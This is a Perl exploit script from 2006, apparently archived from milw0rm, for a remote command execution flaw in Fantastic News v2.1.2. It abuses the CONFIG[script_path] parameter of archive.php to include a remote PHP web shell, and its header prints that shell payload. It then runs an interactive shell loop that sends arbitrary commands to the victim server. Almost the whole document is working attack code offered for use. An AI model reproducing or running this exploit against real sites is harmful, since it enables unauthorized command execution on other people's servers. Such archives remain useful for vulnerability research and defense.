#!/usr/bin/perl
##
# Fantastic News v2.1.2 (and possibly below) Remote Command Execution 
# Bug Found By uid0 Exploit Coded by Zod
## 
# (c) 2006
# ExploiterCode.com
##
# usage:
# perl FNews.pl <location of Fantastic News> <cmd shell location <cmd shell variable>
#
# perl FNews.pl http://site.com/FNews/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
# hai to: zodiac, nex, kutmaster, spic, cijfer ;P, ReZeN, wr0ck, and everyone else!
##
# Contact: www.exploitercode.com irc.exploitercode.com
##

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
	print "[shell] \$";
while(<STDIN>)
        {
                $cmd=$_;
                chomp($cmd);
         
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'archive.php?CONFIG[script_path]='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[ê]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
	{print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.+)<br.\/>.<b>Fatal.error/)
{
	$finreturn = $1;
	$finreturn=~ tr/[ê]/[\n]/;
	print "\r\n$finreturn\n\r";
	last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n============================================================================\r\n";
 print " * Fantastic News v2.1.2 Remote Command Execution by ExploiterCode.com *\r\n";   
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: FNews.pl <Site> <cmd shell> <cmd variable>\r\n\n";
 print " <Site> - Full path to M - Phorum e.g. http://www.site.com/FNews/ \r\n";
 print " <cmd shell> - Path to Cmd Shell e.g http://www.site.com/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "		  -=Coded by Zod, Bug Found by uid0=-\r\n";
 print "	www.exploitercode.com irc.exploitercode.com #exploitercode\r\n";
 print "============================================================================\r\n";
 exit();
 }

# milw0rm.com [2006-03-04]